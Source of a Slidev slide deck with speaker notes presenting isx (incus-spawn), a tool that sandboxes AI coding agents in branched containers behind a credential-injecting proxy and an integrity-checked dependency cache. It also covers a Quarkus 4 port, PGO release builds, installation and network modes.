  <li><span class="t">dnsmasq sends every intercepted domain to the host; a redirect takes <span class="kw">:443</span> to the proxy's <span class="kw">:18443</span></span></li>
  <li><span class="t">SNI picks the certificate: a Vert.x <span class="kw">keyManagerFactoryMapper</span> mints one per name on first use, signed by a CA only the machines trust</span></li>
  <li><span class="t">The request carries the machine's proof; the proxy checks it, adds the real credential, and re-encrypts upstream on pooled Vert.x clients</span></li>
  <li><span class="t">Bodies stream through, with a budget for what's held in memory; WebSockets are relayed once the handshake is decided</span></li>
</ol>

<div class="quote mt-6">Vert.x 4 ran the WebSocket handler before Netty validated the handshake: a request Netty then refused had already had its credential injected. Vert.x 5 splits the handshake off: <span class="kw">accept()</span> or <span class="kw">reject()</span>, decided first.<cite>incus-spawn #972, fixed by the port to Vert.x 5</cite></div>

<!--
Sources: design/proxy.md ("How it works"; "Certificates are chosen per SNI name, at any depth (#783)"; the WebSocket handshake section) and the Quarkus 4 port commit (b7330b7c).
Details if asked: a name outside every intercepted domain, a client sending no SNI, or a name past MAX_SERVED_NAMES is refused, never answered with an unrelated certificate; the cap exists because Vert.x caches an SslContext per answered name and never evicts (reported upstream as V-T5). Vert.x 5 holds an undecided handshake open until the idle timeout, so every path must call accept() or reject().
Bridge: the next two slides are the proxy's second job, the cache: first the dilemma, then the answer.
-->

---
clicks: 3
---

## To cache, <span class="warn">or not to cache?</span>

<div class="cards three equal dilemma mt-4">
  <div class="card warn"><h4>"Cache it, obviously."</h4><p class="voice"><span class="s">Every build downloads the same internet again, and keeps its own copy.</span><span class="s">Builds share nothing, on the wire or on disk.</span><span class="s">Tests are affected by slow builds, rate limits and flaky networks.</span></p></div>
  <div v-click="2" class="card you"><h4>Me</h4><p class="voice"><span class="s">"I don't have fibre.</span><span class="s">I can't download 1,500 dependencies again for every reproducer.</span><span class="s">And I don't want cache problems either.</span><span class="s">No agent should be able to poison another agent's Maven repository."</span></p></div>
  <div v-click="1" class="card danger"><h4>"Never cache anything."</h4><p class="voice"><span class="s">Caches bite, in ways you can't predict.</span><span class="s">Remember the shared <span class="kw">~/.m2</span>: it poisoned two days of evidence.</span><span class="s">You can't trust a build you can't reproduce.</span></p></div>
</div>

<h1 v-click="3" class="statement dilemma-q">Could we have <span class="accent">both</span>?</h1>

<!--
Play both colleagues straight: each is right. Left first, then right, then me, stuck in the middle. The first is the "Set up once" argument again: without a cache, every machine downloads its own copy and keeps it, so nothing is shared, not even on disk. The second is the one who lost two days to the shared ~/.m2. The middle card's last line is the requirement that ties them together: a cache shared by every machine must never let one agent poison another's dependencies (the shared ~/.m2 story, but across machines). The next slide's first row answers it: the cache never touches anything that can change (SNAPSHOTs, metadata), and stores nothing upstream wouldn't send again. Then click: could we have both? The next slide is the answer.
-->

---
clicks: 6
---

## Both: <span class="accent">cached, and never stale</span>

<p class="lead">One rule: a cached file is served <span class="accent">only if a fresh download would return the same bytes</span>.</p>

<CacheFlow class="mt-6" />

<p class="note pin">Container layers and tool downloads are keyed by their SHA-256 digest. And the last resort is a command: <span class="kw">isx clean cache</span> throws the whole cache away; all you lose is a download.</p>

<!--
The answer to the dilemma, as a story of how the design got here. Start with what a cache must never touch (row 1: anything that can change, and anything private, since the cache is shared by every machine). Then the obvious half (row 2): download once, but keep the copy only if the bytes match the checksum upstream sent with them; with no checksum, serve but don't store. Then the part that makes it safe (row 3): a hit doesn't trust the disk, it asks Central "is this still what you'd send?" with one HEAD and compares checksums; only a match serves the stored copy. Row 4 is why that matters: a republished or withdrawn artifact is evicted on the spot and fetched fresh, whichever build tool asks. Row 5 is the honest edge: with Central unreachable, the copy is served unconfirmed, and only then, with a 30-second backoff so a dead network doesn't cost a timeout per request.
The efficiency claim, stated carefully: what's saved is the download, not the round trip; a hit still costs one HEAD. For Maven 3.9+ that HEAD replaces the .sha1 request the client would have made anyway. Don't quote the old ~2.8 ms vs ~177 ms figures (docs/PERFORMANCE-NOTES.md, 2026-08-28): they predate the HEAD per hit and the bench notes say they're not comparable any more.
Then the second group, one click: OCI registries work the other way round. A layer is requested by its sha256 digest, so the name is the checksum: the proxy verifies the bytes against it before storing (MitmProxy, BLOB_DIGEST_PATTERN / finalizeCacheFile) and a hit is served from disk with nothing to ask; manifests, tags and auth tokens are relayed, never cached, because a tag can move. That's the contrast to say out loud: Maven names a coordinate, OCI names the bytes; the rule is the same, the check follows the protocol. Gradle (Plugin Portal, distributions) is Maven-like but has no checksum header, so a hit re-fetches the .sha1/.sha256 sidecar instead of a HEAD.
Source: incus-spawn PR #792 (fixes #555, merged 2026-09-26, in v0.5.0), its DESIGN.md section "Maven/Gradle cache integrity"; OCI: proxy/MitmProxy.java (unchanged by #792). Scope: Maven Central, the Gradle Plugin Portal and Gradle distributions, and npm; other domains are never cached. npm tarballs follow the same rule (#787, in v0.5.0): a tarball is checked against the registry's dist.integrity (SHA-512) on store, and a version withdrawn upstream stops being served.
-->

---



## Every request passes <span class="accent">one point</span>

<p class="lead">Swap the account an agent uses, while it runs: <span class="tag shipped">shipped</span></p>

```bash
isx account set agent-1 claude=personal
```

<p class="note mt-2">The next request uses the new account. Nothing inside restarts, and the agent can't tell.</p>

<p class="note" style="margin-top: 4px">(Switching between Claude auth modes is the exception: that's fixed at template build.)</p>

<p class="lead mt-6">And because every API call passes there, without touching the machine: <span class="kw">isx proxy activity</span></p>

<div class="cards mt-3">
  <div class="card"><h4>Activity <span class="tag shipped">shipped</span></h4><p>Working, or stuck? Requests in flight, last model call.</p></div>
  <div class="card"><h4>Spend <span class="tag shipped">shipped</span></h4><p>Model calls and tokens, per agent.</p></div>
  <div class="card"><h4>Audit <span class="tag shipped">partly</span></h4><p>Traffic per domain, per agent. Every call: next.</p></div>
  <div class="card warn"><h4>Routing <span class="tag roadmap">roadmap</span></h4><p>Model calls re-routed on the fly.</p></div>
</div>

<!--
Shipped in v0.5.0: isx proxy activity shows, per instance, requests and bytes, what's in flight, the last model request and response, and input/output/cache tokens; --by-domain gives one row per domain, --format=json serves scripts (#898, #935). It's also what isx mcp's instance_activity reads, so a coordinating agent can tell a working instance from a stuck one. Audit is "partly": counts per domain, not a log of every call. Routing is still direction, not a feature: incus-spawn #322.
-->

---



## Porting to Quarkus 4: <span class="accent">what we learned</span>

<p class="lead">Quarkus 3.40 → 4.0.0.Beta3, which means Vert.x 4.5 → 5.2 and Netty 4.1 → 4.2. We tried it on isx before it ships.</p>

<div class="cards three equal mt-4">
  <div class="card"><h4>What changed</h4><p>Only the proxy: 31 files. The CLI and common compiled as they were. WebSocket upgrades move to a handshake handler that must <span class="kw">accept()</span> or <span class="kw">reject()</span>; <span class="kw">getHost()</span> becomes <span class="kw">authority()</span>.</p></div>
  <div class="card"><h4>What it fixed</h4><p>The handshake is decided before a credential is added (#972). A frame pipelined with the upgrade request is no longer dropped and leaked (fixed in Vert.x 5.2.3).</p></div>
  <div class="card"><h4>What goes back upstream</h4><p>8 notes for Quarkus, 13 for Vert.x. Two examples: the async DNS resolver is back in native images (+2.2 MiB); a server's SNI certificate lookup runs on the event loop by default.</p></div>
</div>

<p class="note pin">Written down as we went, with the upstream issue where one is filed: <span class="kw">docs/dev/QUARKUS-4.md</span> in the isx repository. GraalVM 25.0.4 is now the minimum, so there are no Intel Mac builds any more.</p>

<!--
Framing: an early port of a real application, not a claim about the beta. The record says why: the beta is treated as a final release so every open problem is written down and goes upstream; an item is removed once a release fixes it.
The port: commit b7330b7c (2026-11-04), 31 files. HttpClientRequest.getHost()/getPort() become authority(), the request's own Host; sendHead() becomes writeHead(); the test doubles move to the Vert.x 5 WebSocket client. Vert.x 5 holds an undecided handshake open until the idle timeout, so every path must decide.
Feedback examples, from docs/dev/QUARKUS-4.md: Q-1, Netty's resolver and DNS codec are linked although Quarkus forces the property off in native, 2.2 MiB in the proxy (quarkusio/quarkus#58063, open); Q-3, Jackson 3 core always reachable in Vert.x native images, 0.87 MiB with no JSON in use; Q-12, GraalVM 25.0.4 minimum, and Oracle ships no macOS x64 build after 25.0.1. Vert.x: V-T1, a regression: a server's SNI key-manager lookup runs on the event loop by default (isx sets useWorkerThread on the SSL engine); V-W1, Vert.x 5.2.2 dropped a frame pipelined with the upgrade request and leaked its buffer (eclipse-vertx/vert.x#6475, fixed in 5.2.3 by #6490).
A good slide to hand to the hosts: what would they like to hear more about?
-->

---
layout: center
---

<p class="kicker">Startup, measured</p>

<h1 class="statement">Jackson databind took <span class="warn">108 ms</span><br>of a 194 ms CLI start.</h1>

<p class="lead mt-8">So every YAML and JSON in isx goes through <span class="kw">jjq</span>, from Hyperfoil: generated mappings, no reflection, initialized at build time. <span class="kw">isx tools</span> went from 9.6 ms to <span class="accent">4.8 ms</span>.</p>

<!--
Source: design/native-image.md, "jjq rather than Jackson" (#1250). The 4.8 vs 9.6 ms is native, with 100 user tools defined. The JVM distribution no longer carries Jackson or SnakeYAML at all.
Why it works in native without @RegisterForReflection: the generated @JqMapped mappings are registered explicitly (no ServiceLoader), and they're initialized at image-build time, so even the java.lang.reflect.Field lookups they need end up in the image heap. Enums are the exception: jjq reads their annotations by reflection, so they keep @RegisterForReflection, and a test fails for one without it.
Honest footnote: Vert.x 5 still brings Jackson 3 core into the proxy (Q-3 on the previous slide).
-->

---



## PGO, <span class="accent">in every release</span>

<div class="stats mt-4">
  <div class="stat"><b class="accent">−58%</b><span>proxy binary: 99 MB → 42 MB</span></div>
  <div class="stat"><b class="accent">+19–83%</b><span>proxy throughput, by path</span></div>
  <div class="stat"><b class="accent">−17–20%</b><span>CLI startup, every command</span></div>
</div>

<ol class="steps mt-6">
  <li><span class="t">The release run builds instrumented binaries of the same commit</span></li>
  <li><span class="t">It drives them with real workloads: Hyperfoil loads on the proxy (Maven, npm, Anthropic, Vertex, WebSockets), and the CLI's branch, shell, git and TUI flows</span></li>
  <li><span class="t">It builds <span class="kw">-O3</span> with the merged profiles; a quality gate fails a build that didn't take its profile</span></li>
</ol>

<p class="note pin">Not <span class="kw">quarkus.native.pgo.enabled</span>: it ties the profile to the native integration tests, and an unrepresentative profile is worse than none.</p>

<!--
Source: design/native-image.md, "Profile-guided optimization" (#1637), and docs/dev/PERFORMANCE-NOTES.md "Phase 2" (interleaved A/B against the previous release flags). Idle RSS of the proxy also dropped 39%.
Why the proxy shrinks: PGO compiles what the profile marks hot at full speed and everything else for size. About 20% of the proxy's methods and 15% of the CLI's have a profile. The cost: a path no workload reaches runs as cold code (host routes and the MCP bridge, today).
Nothing is stored between releases: the profile always matches the released commit, and a failed collection fails the release.
-->

---
layout: center
class: glow-accent
---

<h1 class="statement">Demo</h1>

<!--
On tpl-quarkus: branch (seconds, from a primed template, Maven cache warm) → no secrets inside, yet everything authenticates → the agent fixes and commits alone → git fetch, review the diff, cherry-pick → isx destroy.
-->

---
layout: center
---

<p class="kicker">One more thing</p>

<h1 class="statement">isx is built <span class="accent">by agents, inside isx</span>.</h1>

<div class="stats" style="margin-top: 44px">
  <div class="stat"><b class="accent">2,239</b><span>of 2,636 commits on main, by an AI assistant, since March</span></div>
  <div class="stat"><b class="accent">110k</b><span>lines of Java, and 124k more of tests</span></div>
</div>

<p class="lead mt-8">Reviewed like any other pull request. And because its machines are wiped, everything it learns goes in the repository: <span class="kw">CLAUDE.md</span>, <span class="kw">design/</span>, <span class="kw">.claude/rules/</span>.</p>

<!--
Figures from incus-spawn main on 2026-11-09: git log authors ("Sanne's AI assistant" 2,239; Sanne 212; Yoann Rodière 110; Peter Palaga's AI agent 6), first commit 2026-03-31; line counts of src/main and src/test Java. Re-count before presenting.
The point for this audience: the Quarkus 4 port, the PGO pipeline and the jjq migration on the last slides were all done this way, by agents in isx machines, with a human reviewing.
-->

---



## Get started

<div class="cards mt-2 install">
  <div class="card"><h4>Fedora / RHEL</h4><div class="cmd small">sudo dnf install -y 'dnf5-command(copr)'<br>sudo dnf copr enable sanne/incus-spawn<br>sudo dnf install incus-spawn</div></div>
  <div class="card"><h4>macOS <span class="muted">(Apple Silicon)</span></h4><div class="cmd small">brew install Sanne/tap/incus-spawn</div></div>
  <div class="card"><h4>Any Linux</h4><div class="cmd small">curl -fsSL https://isx.run | sh</div></div>
  <div class="card"><h4>Already have a JVM?</h4><div class="cmd small">jbang app install isx@Sanne/incus-spawn<br>jbang app install isx-proxy@Sanne/incus-spawn</div></div>
</div>

<div class="card mt-2 install"><h4>Ubuntu / Debian</h4><div class="cmd small">curl -fsSL https://sanne.github.io/isx-apt-releases/public.gpg \<br>&nbsp;&nbsp;| sudo gpg --yes --dearmor -o /usr/share/keyrings/incus-spawn.gpg<br>echo "deb [signed-by=/usr/share/keyrings/incus-spawn.gpg] https://sanne.github.io/isx-apt-releases stable main" \<br>&nbsp;&nbsp;| sudo tee /etc/apt/sources.list.d/incus-spawn.list<br>sudo apt update && sudo apt install incus-spawn</div></div>

<p class="note mt-2">Then <span class="kw">isx init</span>, add <a class="kw" href="https://github.com/Sanne/incus-spawn-templates">incus-spawn-templates</a> to <span class="kw">searchPaths</span>, <span class="kw">isx build tpl-quarkus</span>, <span class="kw">isx branch my-feature --from tpl-quarkus</span>.</p>

<!--
tpl-quarkus is the community template in github.com/Sanne/incus-spawn-templates (images/quarkus.yaml): parent tpl-mydev, podman, graalvm, mvnd and Claude Code, cloning quarkus and quarkus-quickstarts, primed with a breadth-first mvnd install. To use it: add that checkout under searchPaths: in ~/.config/incus-spawn/config.yaml. The built-in tpl-dev and tpl-java are deprecated in v0.5.0 (#1195); the same definitions live in that repository.
Commands from the isx README (Quick Start), v0.5.0. On RHEL 9 the copr plugin is 'dnf-command(copr)'. JBang needs both apps, and jbang must stay on the PATH. Intel Macs: v0.4.2 was the last release built for them. Debian/Ubuntu updates come with apt upgrade; Fedora with dnf. Plain isx, with no arguments, opens the TUI. On macOS, isx runs its own small Linux VM: no Docker Desktop. Full instructions at isx.run.
isx init: Per the isx README: on Linux, isx init installs Incus through your package manager and creates a btrfs pool if needed; on macOS it provisions the vfkit VM. It prompts for the credentials the proxy will inject, and can install the proxy as a systemd user service (launchd on macOS). The real keys stay in ~/.config/incus-spawn/ on the host.
-->

---
layout: center
class: glow-accent
clicks: 3
---

<h1 class="statement">Hand the agent a task, walk away,<br><span v-click="1">come back to <span class="accent">a tested commit</span>.</span></h1>

<p v-click="2" class="lead mt-10">Questions?</p>

<div class="ask mt-4">
  <a v-click="2" class="site" href="https://isx.run" target="_blank">isx.run</a>
  <span v-click="3" class="or">or, later</span>
  <span v-click="3" class="kw typed">isx ask "how do I set up a template for my repo?"</span>
</div>

<!--
The opening sentence again, with one word changed: that's the whole talk. "Hand the agent a task, walk away," pause, click: "come back to a tested commit." The word that carries the talk is "tested": any agent on your laptop can hand you code changes; this one hands you a commit whose tests ran, in a machine of its own, under its own name, and which you review like any other pull request. Click: questions, and the site. Click, as an afterthought: the command types itself. Say: and if you think of one later, ask isx itself.
isx ask answers questions about isx itself, from its own documentation (it spends tokens). It needs an Anthropic API key, Vertex AI or an OpenAI key: a Claude Pro/Max subscription only serves Claude Code. isx init offers to add a key beside a subscription, and Max and Team plans include monthly API credits that pay for one. Also reachable as ? in the TUI.
-->

---
layout: center
class: divider
---

<div class="ghost">+</div>

# Backup

<p>For questions</p>

---



## Can't we just use <span class="muted">Docker?</span>

<table class="mt-2">
  <thead><tr><th>Capability</th><th>Docker / Podman</th><th>isx</th></tr></thead>
  <tbody>
    <tr><td>Init system (systemd)</td><td class="warn">Not in Docker by default; Podman supports it</td><td class="accent">Every machine boots one</td></tr>
    <tr><td>Nested containers (Testcontainers, compose)</td><td class="warn">Needs <span class="kw">--privileged</span> or extra setup</td><td class="accent">Work out of the box</td></tr>
    <tr><td>Profilers (perf)</td><td class="warn">Blocked by the default seccomp profile</td><td class="accent">Work</td></tr>
    <tr><td>Branch a whole environment</td><td class="warn">Commit it to a new image</td><td class="accent"><span class="kw">isx branch</span>: a CoW clone in seconds</td></tr>
    <tr><td>Credential isolation</td><td class="warn">Up to you</td><td class="accent">Built in: real keys never enter</td></tr>
  </tbody>
</table>

<p class="note pin">Docker can be configured to do most of this. It's built for shipping apps, so a workstation isn't its default; isx makes a complete dev machine the default.</p>

---



## Or a <span class="muted">VM</span> per agent?

<table class="mt-2">
  <thead><tr><th></th><th>A full VM</th><th>isx container</th></tr></thead>
  <tbody>
    <tr><td>Startup</td><td class="warn">Boots its own kernel: seconds</td><td class="accent">Shares the host kernel: near-instant</td></tr>
    <tr><td>Memory</td><td class="warn">Guess up front. Too low: the build dies. Too high: that RAM is set aside for one guest, whose kernel fills it with its own cache, so fewer fit and your laptop has less slack</td><td class="accent">One kernel manages all of it: idle machines cost little, and cache, swap and priorities are shared across every machine</td></tr>
    <tr><td>Cost per instance</td><td class="warn">A guest kernel and firmware</td><td class="accent">Just the processes</td></tr>
    <tr><td>Isolation boundary</td><td class="accent">Separate kernel: stronger</td><td class="warn">Shared kernel</td></tr>
  </tbody>
</table>

<p class="note pin">The last row is the honest one. On Linux isx runs both, one flag apart: <span class="kw">--type vm</span> when you want it; on macOS, containers only. The container is the default because it's cheap enough to branch per task.</p>

---



## Why <span class="accent">a system container</span>?

<div class="cards three mt-4">
  <div class="card warn"><h4>Docker / Podman</h4><p>Built to ship one app. No init by default, nested containers need <span class="kw">--privileged</span>, <span class="kw">perf</span> is blocked by the default seccomp profile. All of it configurable; none of it the default.</p></div>
  <div class="card warn"><h4>A VM per agent</h4><p>The strongest boundary: its own kernel. Also a memory guess per agent, and a guest kernel's worth of cost each, so fewer fit on a laptop.</p></div>
  <div class="card"><h4>An isx machine</h4><p>A full distribution with its own init, where nested containers and profilers just work. It shares the host kernel, so it's cheap enough to branch one per task.</p></div>
</div>

<p class="note pin">Containers share the host kernel. For code you believe is malicious, build the template as a VM on Linux: <span class="kw">isx build tpl-java --type vm</span>. Full comparison: backup slides.</p>

<!--
The two comparison tables are in the backup section at the end, for questions.
Docker: ping and strace work by default (ping_group_range since 2020, ptrace allowed on kernel ≥ 4.8); only say what's true. Podman supports systemd in containers.
VM memory: a guest reserves its RAM and its kernel fills it with page cache; containers get a ceiling (isx: 60% of host RAM), not a reservation, and one kernel shares cache, swap and priorities across all of them.
-->

---
clicks: 3
---

## Network modes

<table class="mt-2">
  <thead><tr><th>Mode</th><th>Flag</th><th>What it does</th></tr></thead>
  <tbody>
    <tr><td>Full internet</td><td class="muted">(default)</td><td>Unrestricted access; authentication via the proxy</td></tr>
    <tr><td>Proxy only</td><td><span class="kw">--proxy-only</span></td><td>All outbound traffic dropped except the proxy and DNS, enforced on the host</td></tr>
    <tr><td>Airgapped</td><td><span class="kw">--airgap</span></td><td>Network device removed</td></tr>
  </tbody>
</table>

<NetworkModes class="mt-6" />

<!--
One click per panel: the same machine and the same three requests each time. api.anthropic.com and github.com go through the proxy because isx intercepts them (github.com when the template has gh); evil.example stands for any other host.
Airgapped runs no agent: the agent needs its model's API, and there's no network at all. It's for running code you don't trust, like an outside pull request or a bug reproducer: let the agent prepare a machine with network, then branch it with --airgap (isx branch run-1 --from repro-1 --airgap) and run only the tests. Dependencies have to be there already, from the template's prime step or the agent's earlier build. (An agent with a local model inside the machine could work offline, but isx doesn't set that up.)
-->

---



## What <span class="kw">isx branch</span> does, in seconds

<ol class="steps mt-4">
  <li v-click>CoW-copies the template: a btrfs snapshot, no data copied</li>
  <li v-click>Gives it a static IP, written into its network config before it boots</li>
  <li v-click>Installs your SSH key: <span class="kw">ssh agent-1</span> just works</li>
  <li v-click>Adds an <span class="kw">isx://agent-1/…</span> git remote to each matching checkout on your laptop</li>
  <li v-click>Tells the proxy which accounts this machine uses</li>
  <li v-click>Starts it, and drops you into a shell or starts the agent</li>
</ol>

<p v-click class="note pin"><span class="kw">isx destroy</span> undoes all of it: the machine, its disk delta, its SSH key and its git remotes.</p>

---
clicks: 2
---

## Under <span class="kw">git fetch agent-1</span>

<GitHelper class="mt-2" />

<!--
The hops: git sees an isx:// URL and runs git-remote-isx; that hands over to the native isx helper, which checks the machine exists and only allows the git service; Incus exec opens git-upload-pack inside the machine, and the pack stream flows through the WebSocket untouched.
If asked why there's a bash shim in front of the native helper: git's helper protocol starts with a few text lines, then switches to binary on the same pipe. Java's buffered stdin would read ahead into the binary stream; bash answers the text lines, then execs, so the native helper inherits a clean pipe. (DESIGN.md, "Git remote helper: bash + Java split".)
-->
